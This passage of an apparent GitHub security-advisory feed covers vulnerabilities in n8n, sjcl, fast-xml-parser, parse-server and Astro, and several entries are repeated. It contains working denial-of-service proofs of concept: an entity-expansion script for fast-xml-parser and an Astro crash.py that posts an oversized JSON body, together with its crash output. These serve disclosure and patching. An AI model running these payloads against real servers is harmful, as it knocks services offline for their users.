<p>An authenticated user with permission to create or modify workflows could use the JavaScript Task Runner to allocate uninitialized memory buffers. Uninitialized buffers may contain residual data from the same Node.js process — including data from prior requests, tasks, secrets, or tokens — resulting in information disclosure of sensitive in-process data.</p>
<ul>
<li>Task Runners must be enabled using <code>N8N_RUNNERS_ENABLED=true</code>.</li>
<li>In external runner mode, the impact is limited to data within the external runner process.</li>
</ul>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n versions &gt;= 1.123.22, &gt;= 2.10.1 , and &gt;= 2.9.3. Users should upgrade to this version or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Limit workflow creation and editing permissions to fully trusted users only.</li>
<li>Use external runner mode (<code>N8N_RUNNERS_MODE=external</code>) to isolate the runner process.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-xvh5-5qg4-x9qp">https://github.com/n8n-io/n8n/security/advisories/GHSA-xvh5-5qg4-x9qp</a></li>
<li><a href="https://docs.n8n.io/hosting/configuration/task-runners">https://docs.n8n.io/hosting/configuration/task-runners</a></li>
<li><a href="https://docs.n8n.io/hosting/securing/blocking-nodes">https://docs.n8n.io/hosting/securing/blocking-nodes</a></li>
<li><a href="https://github.com/advisories/GHSA-xvh5-5qg4-x9qp">https://github.com/advisories/GHSA-xvh5-5qg4-x9qp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xvh5-5qg4-x9qp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-25T17:00:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n] n8n has In-Process Memory Disclosure in its Task Runner]]></title>
        <id>https://github.com/advisories/GHSA-xvh5-5qg4-x9qp</id>
        <link href="https://github.com/advisories/GHSA-xvh5-5qg4-x9qp"/>
        <updated>2026-03-25T17:00:30.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>An authenticated user with permission to create or modify workflows could use the JavaScript Task Runner to allocate uninitialized memory buffers. Uninitialized buffers may contain residual data from the same Node.js process — including data from prior requests, tasks, secrets, or tokens — resulting in information disclosure of sensitive in-process data.</p>
<ul>
<li>Task Runners must be enabled using <code>N8N_RUNNERS_ENABLED=true</code>.</li>
<li>In external runner mode, the impact is limited to data within the external runner process.</li>
</ul>
<h2 id="patches">Patches</h2>
<p>The issue has been fixed in n8n versions &gt;= 1.123.22, &gt;= 2.10.1 , and &gt;= 2.9.3. Users should upgrade to this version or later to remediate the vulnerability.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If upgrading is not immediately possible, administrators should consider the following temporary mitigations:</p>
<ul>
<li>Limit workflow creation and editing permissions to fully trusted users only.</li>
<li>Use external runner mode (<code>N8N_RUNNERS_MODE=external</code>) to isolate the runner process.</li>
</ul>
<p>These workarounds do not fully remediate the risk and should only be used as short-term mitigation measures.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/n8n-io/n8n/security/advisories/GHSA-xvh5-5qg4-x9qp">https://github.com/n8n-io/n8n/security/advisories/GHSA-xvh5-5qg4-x9qp</a></li>
<li><a href="https://docs.n8n.io/hosting/configuration/task-runners">https://docs.n8n.io/hosting/configuration/task-runners</a></li>
<li><a href="https://docs.n8n.io/hosting/securing/blocking-nodes">https://docs.n8n.io/hosting/securing/blocking-nodes</a></li>
<li><a href="https://github.com/advisories/GHSA-xvh5-5qg4-x9qp">https://github.com/advisories/GHSA-xvh5-5qg4-x9qp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xvh5-5qg4-x9qp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-25T17:00:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sjcl] sjcl is missing point-on-curve validation in sjcl.ecc.basicKey.publicKey]]></title>
        <id>https://github.com/advisories/GHSA-2w8x-224x-785m</id>
        <link href="https://github.com/advisories/GHSA-2w8x-224x-785m"/>
        <updated>2026-03-25T14:36:31.000Z</updated>
        <content type="html"><![CDATA[<p>All versions of the package sjcl are vulnerable to Improper Verification of Cryptographic Signature due to missing point-on-curve validation in sjcl.ecc.basicKey.publicKey(). An attacker can recover a victim's ECDH private key by sending crafted off-curve public keys and observing ECDH outputs. The dhJavaEc() function directly returns the raw x-coordinate of the scalar multiplication result (no hashing), providing a plaintext oracle without requiring any decryption feedback.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4258">https://nvd.nist.gov/vuln/detail/CVE-2026-4258</a></li>
<li><a href="https://github.com/bitwiseshiftleft/sjcl/commit/ee307459972442a17beebc29dc331fffd8aff796">https://github.com/bitwiseshiftleft/sjcl/commit/ee307459972442a17beebc29dc331fffd8aff796</a></li>
<li><a href="https://gist.github.com/Kr0emer/2560f98edb10b0b34f2438cd63913c47">https://gist.github.com/Kr0emer/2560f98edb10b0b34f2438cd63913c47</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-SJCL-15369617">https://security.snyk.io/vuln/SNYK-JS-SJCL-15369617</a></li>
<li><a href="https://github.com/bitwiseshiftleft/sjcl/blob/master/core/ecc.js#L454-L461">https://github.com/bitwiseshiftleft/sjcl/blob/master/core/ecc.js#L454-L461</a></li>
<li><a href="https://github.com/advisories/GHSA-2w8x-224x-785m">https://github.com/advisories/GHSA-2w8x-224x-785m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2w8x-224x-785m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-17T06:31:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fast-xml-parser] fast-xml-parser affected by numeric entity expansion bypassing all entity expansion limits (incomplete fix for CVE-2026-26278)]]></title>
        <id>https://github.com/advisories/GHSA-8gc5-j5rx-235r</id>
        <link href="https://github.com/advisories/GHSA-8gc5-j5rx-235r"/>
        <updated>2026-03-25T14:31:41.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The fix for CVE-2026-26278 added entity expansion limits (<code>maxTotalExpansions</code>, <code>maxExpandedLength</code>, <code>maxEntityCount</code>, <code>maxEntitySize</code>) to prevent XML entity expansion Denial of Service. However, these limits are only enforced for DOCTYPE-defined entities. <strong>Numeric character references</strong> (<code>&amp;#NNN;</code> and <code>&amp;#xHH;</code>) and standard XML entities (<code>&amp;lt;</code>, <code>&amp;gt;</code>, etc.) are processed through a separate code path that does NOT enforce any expansion limits.</p>
<p>An attacker can use massive numbers of numeric entity references to completely bypass all configured limits, causing excessive memory allocation and CPU consumption.</p>
<h2 id="affected-versions">Affected Versions</h2>
<p>fast-xml-parser v5.x through v5.5.3 (and likely v5.5.5 on npm)</p>
<h2 id="root-cause">Root Cause</h2>
<p>In <code>src/xmlparser/OrderedObjParser.js</code>, the <code>replaceEntitiesValue()</code> function has two separate entity replacement loops:</p>
<ol>
<li><strong>Lines 638-670</strong>: DOCTYPE entities — expansion counting with <code>entityExpansionCount</code> and <code>currentExpandedLength</code> tracking. This was the CVE-2026-26278 fix.</li>
<li><strong>Lines 674-677</strong>: <code>lastEntities</code> loop — replaces standard entities including <code>num_dec</code> (<code>/&amp;#([0-9]{1,7});/g</code>) and <code>num_hex</code> (<code>/&amp;#x([0-9a-fA-F]{1,6});/g</code>). <strong>This loop has NO expansion counting at all.</strong></li>
</ol>
<p>The numeric entity regex replacements at lines 97-98 are part of <code>lastEntities</code> and go through the uncounted loop, completely bypassing the CVE-2026-26278 fix.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-javascript">const { XMLParser } = require('fast-xml-parser');

// Even with strict explicit limits, numeric entities bypass them
const parser = new XMLParser({
  processEntities: {
    enabled: true,
    maxTotalExpansions: 10,
    maxExpandedLength: 100,
    maxEntityCount: 1,
    maxEntitySize: 10
  }
});

// 100K numeric entity references — should be blocked by maxTotalExpansions=10
const xml = `&lt;root&gt;${'&amp;#65;'.repeat(100000)}&lt;/root&gt;`;
const result = parser.parse(xml);

// Output: 500,000 chars — bypasses maxExpandedLength=100 completely
console.log('Output length:', result.root.length);  // 500000
console.log('Expected max:', 100);  // limit was 100
</code></pre>
<p><strong>Results:</strong></p>
<ul>
<li>100K <code>&amp;#65;</code> references → 500,000 char output (5x default maxExpandedLength of 100,000)</li>
<li>1M references → 5,000,000 char output, ~147MB memory consumed</li>
<li>Even with <code>maxTotalExpansions=10</code> and <code>maxExpandedLength=100</code>, 10K references produce 50,000 chars</li>
<li>Hex entities (<code>&amp;#x41;</code>) exhibit the same bypass</li>
</ul>
<h2 id="impact">Impact</h2>
<p><strong>Denial of Service</strong> — An attacker who can provide XML input to applications using fast-xml-parser can cause:</p>
<ul>
<li>Excessive memory allocation (147MB+ for 1M entity references)</li>
<li>CPU consumption during regex replacement</li>
<li>Potential process crash via OOM</li>
</ul>
<p>This is particularly dangerous because the application developer may have explicitly configured strict entity expansion limits believing they are protected, while numeric entities silently bypass all of them.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Apply the same <code>entityExpansionCount</code> and <code>currentExpandedLength</code> tracking to the <code>lastEntities</code> loop (lines 674-677) and the HTML entities loop (lines 680-686), similar to how DOCTYPE entities are tracked at lines 638-670.</p>
<h2 id="workaround">Workaround</h2>
<p>Set <code>htmlEntities:false</code></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-8gc5-j5rx-235r">https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-8gc5-j5rx-235r</a></li>
<li><a href="https://github.com/NaturalIntelligence/fast-xml-parser/commit/bd26122c838e6a55e7d7ac49b4ccc01a49999a01">https://github.com/NaturalIntelligence/fast-xml-parser/commit/bd26122c838e6a55e7d7ac49b4ccc01a49999a01</a></li>
<li><a href="https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v5.5.6">https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v5.5.6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33036">https://nvd.nist.gov/vuln/detail/CVE-2026-33036</a></li>
<li><a href="https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v4.5.5">https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v4.5.5</a></li>
<li><a href="https://github.com/advisories/GHSA-8gc5-j5rx-235r">https://github.com/advisories/GHSA-8gc5-j5rx-235r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8gc5-j5rx-235r</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-17T19:45:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[fast-xml-parser] fast-xml-parser affected by numeric entity expansion bypassing all entity expansion limits (incomplete fix for CVE-2026-26278)]]></title>
        <id>https://github.com/advisories/GHSA-8gc5-j5rx-235r</id>
        <link href="https://github.com/advisories/GHSA-8gc5-j5rx-235r"/>
        <updated>2026-03-25T14:31:41.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The fix for CVE-2026-26278 added entity expansion limits (<code>maxTotalExpansions</code>, <code>maxExpandedLength</code>, <code>maxEntityCount</code>, <code>maxEntitySize</code>) to prevent XML entity expansion Denial of Service. However, these limits are only enforced for DOCTYPE-defined entities. <strong>Numeric character references</strong> (<code>&amp;#NNN;</code> and <code>&amp;#xHH;</code>) and standard XML entities (<code>&amp;lt;</code>, <code>&amp;gt;</code>, etc.) are processed through a separate code path that does NOT enforce any expansion limits.</p>
<p>An attacker can use massive numbers of numeric entity references to completely bypass all configured limits, causing excessive memory allocation and CPU consumption.</p>
<h2 id="affected-versions">Affected Versions</h2>
<p>fast-xml-parser v5.x through v5.5.3 (and likely v5.5.5 on npm)</p>
<h2 id="root-cause">Root Cause</h2>
<p>In <code>src/xmlparser/OrderedObjParser.js</code>, the <code>replaceEntitiesValue()</code> function has two separate entity replacement loops:</p>
<ol>
<li><strong>Lines 638-670</strong>: DOCTYPE entities — expansion counting with <code>entityExpansionCount</code> and <code>currentExpandedLength</code> tracking. This was the CVE-2026-26278 fix.</li>
<li><strong>Lines 674-677</strong>: <code>lastEntities</code> loop — replaces standard entities including <code>num_dec</code> (<code>/&amp;#([0-9]{1,7});/g</code>) and <code>num_hex</code> (<code>/&amp;#x([0-9a-fA-F]{1,6});/g</code>). <strong>This loop has NO expansion counting at all.</strong></li>
</ol>
<p>The numeric entity regex replacements at lines 97-98 are part of <code>lastEntities</code> and go through the uncounted loop, completely bypassing the CVE-2026-26278 fix.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-javascript">const { XMLParser } = require('fast-xml-parser');

// Even with strict explicit limits, numeric entities bypass them
const parser = new XMLParser({
  processEntities: {
    enabled: true,
    maxTotalExpansions: 10,
    maxExpandedLength: 100,
    maxEntityCount: 1,
    maxEntitySize: 10
  }
});

// 100K numeric entity references — should be blocked by maxTotalExpansions=10
const xml = `&lt;root&gt;${'&amp;#65;'.repeat(100000)}&lt;/root&gt;`;
const result = parser.parse(xml);

// Output: 500,000 chars — bypasses maxExpandedLength=100 completely
console.log('Output length:', result.root.length);  // 500000
console.log('Expected max:', 100);  // limit was 100
</code></pre>
<p><strong>Results:</strong></p>
<ul>
<li>100K <code>&amp;#65;</code> references → 500,000 char output (5x default maxExpandedLength of 100,000)</li>
<li>1M references → 5,000,000 char output, ~147MB memory consumed</li>
<li>Even with <code>maxTotalExpansions=10</code> and <code>maxExpandedLength=100</code>, 10K references produce 50,000 chars</li>
<li>Hex entities (<code>&amp;#x41;</code>) exhibit the same bypass</li>
</ul>
<h2 id="impact">Impact</h2>
<p><strong>Denial of Service</strong> — An attacker who can provide XML input to applications using fast-xml-parser can cause:</p>
<ul>
<li>Excessive memory allocation (147MB+ for 1M entity references)</li>
<li>CPU consumption during regex replacement</li>
<li>Potential process crash via OOM</li>
</ul>
<p>This is particularly dangerous because the application developer may have explicitly configured strict entity expansion limits believing they are protected, while numeric entities silently bypass all of them.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Apply the same <code>entityExpansionCount</code> and <code>currentExpandedLength</code> tracking to the <code>lastEntities</code> loop (lines 674-677) and the HTML entities loop (lines 680-686), similar to how DOCTYPE entities are tracked at lines 638-670.</p>
<h2 id="workaround">Workaround</h2>
<p>Set <code>htmlEntities:false</code></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-8gc5-j5rx-235r">https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-8gc5-j5rx-235r</a></li>
<li><a href="https://github.com/NaturalIntelligence/fast-xml-parser/commit/bd26122c838e6a55e7d7ac49b4ccc01a49999a01">https://github.com/NaturalIntelligence/fast-xml-parser/commit/bd26122c838e6a55e7d7ac49b4ccc01a49999a01</a></li>
<li><a href="https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v5.5.6">https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v5.5.6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33036">https://nvd.nist.gov/vuln/detail/CVE-2026-33036</a></li>
<li><a href="https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v4.5.5">https://github.com/NaturalIntelligence/fast-xml-parser/releases/tag/v4.5.5</a></li>
<li><a href="https://github.com/advisories/GHSA-8gc5-j5rx-235r">https://github.com/advisories/GHSA-8gc5-j5rx-235r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8gc5-j5rx-235r</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-17T19:45:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[parse-server] Parse Server exposes auth data via /users/me endpoint]]></title>
        <id>https://github.com/advisories/GHSA-37mj-c2wf-cx96</id>
        <link href="https://github.com/advisories/GHSA-37mj-c2wf-cx96"/>
        <updated>2026-03-24T20:17:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An authenticated user calling <code>GET /users/me</code> receives unsanitized auth data, including sensitive credentials such as MFA TOTP secrets and recovery codes. The endpoint internally uses master-level authentication for the session query, and the master context leaks through to the user data, bypassing auth adapter sanitization. An attacker who obtains a user's session token can extract MFA secrets to generate valid TOTP codes indefinitely.</p>
<h3 id="patches">Patches</h3>
<p>The <code>/users/me</code> endpoint now queries the session and user data separately, using the caller's authentication context for the user query so that all security layers apply correctly.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no known workaround.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-37mj-c2wf-cx96">https://github.com/parse-community/parse-server/security/advisories/GHSA-37mj-c2wf-cx96</a></li>
<li><a href="https://github.com/parse-community/parse-server/pull/10278">https://github.com/parse-community/parse-server/pull/10278</a></li>
<li><a href="https://github.com/parse-community/parse-server/pull/10279">https://github.com/parse-community/parse-server/pull/10279</a></li>
<li><a href="https://github.com/advisories/GHSA-37mj-c2wf-cx96">https://github.com/advisories/GHSA-37mj-c2wf-cx96</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-37mj-c2wf-cx96</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-24T20:17:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[parse-server] Parse Server exposes auth data via /users/me endpoint]]></title>
        <id>https://github.com/advisories/GHSA-37mj-c2wf-cx96</id>
        <link href="https://github.com/advisories/GHSA-37mj-c2wf-cx96"/>
        <updated>2026-03-24T20:17:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An authenticated user calling <code>GET /users/me</code> receives unsanitized auth data, including sensitive credentials such as MFA TOTP secrets and recovery codes. The endpoint internally uses master-level authentication for the session query, and the master context leaks through to the user data, bypassing auth adapter sanitization. An attacker who obtains a user's session token can extract MFA secrets to generate valid TOTP codes indefinitely.</p>
<h3 id="patches">Patches</h3>
<p>The <code>/users/me</code> endpoint now queries the session and user data separately, using the caller's authentication context for the user query so that all security layers apply correctly.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There is no known workaround.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-37mj-c2wf-cx96">https://github.com/parse-community/parse-server/security/advisories/GHSA-37mj-c2wf-cx96</a></li>
<li><a href="https://github.com/parse-community/parse-server/pull/10278">https://github.com/parse-community/parse-server/pull/10278</a></li>
<li><a href="https://github.com/parse-community/parse-server/pull/10279">https://github.com/parse-community/parse-server/pull/10279</a></li>
<li><a href="https://github.com/advisories/GHSA-37mj-c2wf-cx96">https://github.com/advisories/GHSA-37mj-c2wf-cx96</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-37mj-c2wf-cx96</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-24T20:17:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[parse-server] Parse Server: MFA recovery code single-use bypass via concurrent requests]]></title>
        <id>https://github.com/advisories/GHSA-2299-ghjr-6vjp</id>
        <link href="https://github.com/advisories/GHSA-2299-ghjr-6vjp"/>
        <updated>2026-03-24T19:48:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker who obtains a user's password and a single MFA recovery code can reuse that recovery code an unlimited number of times by sending concurrent login requests. This defeats the single-use design of recovery codes. The attack requires the user's password, a valid recovery code, and the ability to send concurrent requests within milliseconds.</p>
<h3 id="patches">Patches</h3>
<p>The login handler now uses optimistic locking when updating auth data that contains consumed single-use tokens. If a concurrent request has already modified the recovery array, the update fails and the login is rejected.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no known workarounds.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-2299-ghjr-6vjp">https://github.com/parse-community/parse-server/security/advisories/GHSA-2299-ghjr-6vjp</a></li>
<li><a href="https://github.com/parse-community/parse-server/pull/10275">https://github.com/parse-community/parse-server/pull/10275</a></li>
<li><a href="https://github.com/parse-community/parse-server/pull/10276">https://github.com/parse-community/parse-server/pull/10276</a></li>
<li><a href="https://github.com/advisories/GHSA-2299-ghjr-6vjp">https://github.com/advisories/GHSA-2299-ghjr-6vjp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2299-ghjr-6vjp</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-24T19:48:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[parse-server] Parse Server: MFA recovery code single-use bypass via concurrent requests]]></title>
        <id>https://github.com/advisories/GHSA-2299-ghjr-6vjp</id>
        <link href="https://github.com/advisories/GHSA-2299-ghjr-6vjp"/>
        <updated>2026-03-24T19:48:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker who obtains a user's password and a single MFA recovery code can reuse that recovery code an unlimited number of times by sending concurrent login requests. This defeats the single-use design of recovery codes. The attack requires the user's password, a valid recovery code, and the ability to send concurrent requests within milliseconds.</p>
<h3 id="patches">Patches</h3>
<p>The login handler now uses optimistic locking when updating auth data that contains consumed single-use tokens. If a concurrent request has already modified the recovery array, the update fails and the login is rejected.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no known workarounds.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/parse-community/parse-server/security/advisories/GHSA-2299-ghjr-6vjp">https://github.com/parse-community/parse-server/security/advisories/GHSA-2299-ghjr-6vjp</a></li>
<li><a href="https://github.com/parse-community/parse-server/pull/10275">https://github.com/parse-community/parse-server/pull/10275</a></li>
<li><a href="https://github.com/parse-community/parse-server/pull/10276">https://github.com/parse-community/parse-server/pull/10276</a></li>
<li><a href="https://github.com/advisories/GHSA-2299-ghjr-6vjp">https://github.com/advisories/GHSA-2299-ghjr-6vjp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2299-ghjr-6vjp</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-24T19:48:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@astrojs/node] Astro: Memory exhaustion DoS due to missing request body size limit in Server Islands]]></title>
        <id>https://github.com/advisories/GHSA-3rmj-9m5h-8fpv</id>
        <link href="https://github.com/advisories/GHSA-3rmj-9m5h-8fpv"/>
        <updated>2026-03-24T19:29:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Astro's Server Islands POST handler buffers and parses the full request body as JSON without enforcing a size limit. Because <code>JSON.parse()</code> allocates a V8 heap object for every element in the input, a crafted payload of many small JSON objects achieves ~15x memory amplification (wire bytes to heap bytes), allowing a single unauthenticated request to exhaust the process heap and crash the server. The <code>/_server-islands/[name]</code> route is registered on all Astro SSR apps regardless of whether any component uses <code>server:defer</code>, and the body is parsed before the island name is validated, so any Astro SSR app with the Node standalone adapter is affected.</p>
<h3 id="details">Details</h3>
<p>Astro automatically registers a Server Islands route at <code>/_server-islands/[name]</code> on all SSR apps, regardless of whether any component uses <code>server:defer</code>. The POST handler in <code>packages/astro/src/core/server-islands/endpoint.ts</code> buffers the entire request body into memory and parses it as JSON with no size or depth limit:</p>
<pre><code class="language-js">// packages/astro/src/core/server-islands/endpoint.ts (lines 55-56)
const raw = await request.text();    // full body buffered into memory — no size limit
const data = JSON.parse(raw);        // parsed into V8 object graph — no element count limit
</code></pre>
<p>The request body is parsed before the island name is validated, so the attacker does not need to know any valid island name — <code>/_server-islands/anything</code> triggers the vulnerable code path. No authentication is required.</p>
<p>Additionally, <code>JSON.parse()</code> allocates a heap object for every array/object in the input, so a payload consisting of many empty JSON objects (e.g., <code>[{},{},{},...]</code>) achieves ~15x memory amplification (wire bytes to heap bytes). The entire object graph is held as a single live reference until parsing completes, preventing garbage collection. An 8.6 MB request is sufficient to crash a server with a 128 MB heap limit.</p>
<h3 id="poc">PoC</h3>
<p><strong>Environment:</strong> Astro 5.18.0, <code>@astrojs/node</code> 9.5.4, Node.js 22 with <code>--max-old-space-size=128</code>.</p>
<p>The app does <strong>not</strong> use <code>server:defer</code> — this is a minimal SSR setup with no server island components. The route is still registered and exploitable.</p>
<p><strong>Setup files:</strong></p>
<p><code>package.json</code>:</p>
<pre><code class="language-json">{
  "name": "poc-server-islands-dos",
  "scripts": {
    "build": "astro build",
    "start": "node --max-old-space-size=128 dist/server/entry.mjs"
  },
  "dependencies": {
    "astro": "5.18.0",
    "@astrojs/node": "9.5.4"
  }
}
</code></pre>
<p><code>astro.config.mjs</code>:</p>
<pre><code class="language-js">import { defineConfig } from 'astro/config';
import node from '@astrojs/node';

export default defineConfig({
  output: 'server',
  adapter: node({ mode: 'standalone' }),
});
</code></pre>
<h2 id="srcpagesindexastro-astro"><code>src/pages/index.astro</code>:
```astro</h2>
<hr>

<title>Astro App</title>

  <h1>Hello</h1>
  <p>Just a plain SSR page. No server islands.</p>


```

<p><code>Dockerfile</code>:</p>
<pre><code class="language-dockerfile">FROM node:22-slim
WORKDIR /app
COPY package.json .
RUN npm install
COPY . .
RUN npm run build
EXPOSE 4321
CMD ["node", "--max-old-space-size=128", "dist/server/entry.mjs"]
</code></pre>
<p><code>docker-compose.yml</code>:</p>
<pre><code class="language-yaml">services:
  astro:
    build: .
    ports:
      - "4321:4321"
    deploy:
      resources:
        limits:
          memory: 256m
</code></pre>
<p><strong>Reproduction:</strong></p>
<pre><code class="language-bash"># Build and start
docker compose up -d

# Verify server is running
curl http://localhost:4321/
# =&gt; 200 OK
</code></pre>
<p><code>crash.py</code>:</p>
<pre><code class="language-python">import requests

# Any path under /_server-islands/ works — no valid island name needed
TARGET = "http://localhost:4321/_server-islands/x"

# 3M empty objects: each {} is ~3 bytes JSON but ~56-80 bytes as V8 object
# 8.6 MB on wire → ~180+ MB heap allocation → exceeds 128 MB limit
n = 3_000_000
payload = '[' + ','.join(['{}'] * n) + ']'
print(f"Payload: {len(payload) / (1024*1024):.1f} MB")

try:
    r = requests.post(TARGET, data=payload,
        headers={"Content-Type": "application/json"}, timeout=30)
    print(f"Status: {r.status_code}")
except requests.exceptions.ConnectionError:
    print("Server crashed (OOM killed)")
</code></pre>
<pre><code>$ python crash.py
Payload: 8.6 MB
Server crashed (OOM killed)

$ curl http://localhost:4321/
curl: (7) Failed to connect to localhost port 4321: Connection refused

$ docker compose ps
NAME      IMAGE     COMMAND   SERVICE   CREATED   STATUS    PORTS
(empty — container was OOM killed)
</code></pre>
<p>The server process is killed and does not recover. Repeated requests in a containerized environment with restart policies cause a persistent crash-restart loop.</p>
<h3 id="impact">Impact</h3>
<p>Any Astro SSR app with the Node standalone adapter is affected — the <code>/_server-islands/[name]</code> route is registered by default regardless of whether any component uses <code>server:defer</code>. Unauthenticated attackers can crash the server process with a single crafted HTTP request under 9 MB. In containerized environments with memory limits, repeated requests cause a persistent crash-restart loop, denying service to all users. The attack requires no authentication and no knowledge of valid island names — any value in the <code>[name]</code> parameter works because the body is parsed before the name is validated.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/withastro/astro/security/advisories/GHSA-3rmj-9m5h-8fpv">https://github.com/withastro/astro/security/advisories/GHSA-3rmj-9m5h-8fpv</a></li>
<li><a href="https://github.com/withastro/astro/commit/f9ee8685dd26e9afeba3b48d41ad6714f624b12f">https://github.com/withastro/astro/commit/f9ee8685dd26e9afeba3b48d41ad6714f624b12f</a></li>
<li><a href="https://github.com/withastro/astro/releases/tag/@astrojs/node@10.0.0">https://github.com/withastro/astro/releases/tag/@astrojs/node@10.0.0</a></li>
<li><a href="https://github.com/advisories/GHSA-3rmj-9m5h-8fpv">https://github.com/advisories/GHSA-3rmj-9m5h-8fpv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3rmj-9m5h-8fpv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-24T19:29:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[parse-server] Parse Server has SQL Injection through aggregate and distinct field names in PostgreSQL adapter]]></title>
        <id>https://github.com/advisories/GHSA-p2w6-rmh7-w8q3</id>
        <link href="https://github.com/advisories/GHSA-p2w6-rmh7-w8q3"/>
        <updated>2026-03-24T19:12:07.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker with master key access can execute arbitrary SQL statements on the PostgreSQL database by injecting SQL metacharacters into field name parameters of the aggregate <code>$group</code> pipeline stage or the <code>distinct</code> operation. This allows privilege escalation from Parse Server application-level administrator to PostgreSQL database-level access.</p>
<p>Only Parse Server deployments using PostgreSQL are affected. MongoDB deployments are not affected.</p>
<h3 id="patches">Patches</h3>
